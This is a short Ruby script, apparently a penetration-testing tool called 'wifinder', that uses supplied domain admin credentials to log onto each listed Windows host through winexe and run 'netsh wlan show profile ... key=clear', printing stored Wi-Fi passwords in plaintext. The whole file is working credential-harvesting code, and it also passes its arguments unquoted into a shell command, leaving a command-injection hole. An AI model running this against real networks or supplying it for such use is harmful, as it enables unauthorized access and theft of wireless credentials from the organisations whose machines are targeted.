#!/usr/bin/env ruby
#Used to find wireless connected systems when you have admin creds.
#Logs onto each system, enumerates the profiles and dumps the plaintext password if present.

require 'tty-command'
require 'trollop'
require 'colorize'
require 'logger'


log = Logger.new('debug.log')
cmd = TTY::Command.new(output: log)

def arguments

  opts = Trollop::options do 
    version "wifinder".light_blue
    banner <<-EOS
    wifinder.rb
      EOS

        opt :hosts, "hostlist", :type => String
        opt :username, "your username", :type => String
        opt :password, "your password", :type => String
        opt :domain, "your domain", :type => String
        opt :ssid, "SSID or Wireless Profile Name, usually the same thing", :type => String
        opt :timeout, "Specify Timeout, for example 0.2 would be 200 milliseconds. Default 0.3", :default => 0.3

        if ARGV.empty?
          puts "Need Help? Try ./localadmins --help".red.bold
        exit
      end
    end
  opts
end

def wireless(arg, cmd, log)
  hostfile = File.readlines(arg[:hosts]).map(&:chomp)
  puts "\nEnumerating Wireless Profiles!".green.bold
  hostfile.each do |host|
    puts "#{host}:".red.bold
      out, err = cmd.run!("winexe -U #{arg[:domain]}/#{arg[:username]}%#{arg[:password]} //#{host} 'netsh wlan show profile name=#{arg[:ssid]} key=clear'")
        if out.empty?
          puts "No Wireless Profiles Detected".light_blue.bold
        else
          print out.green.bold
        end
  end
end

arg = arguments
wireless(arg, cmd, log)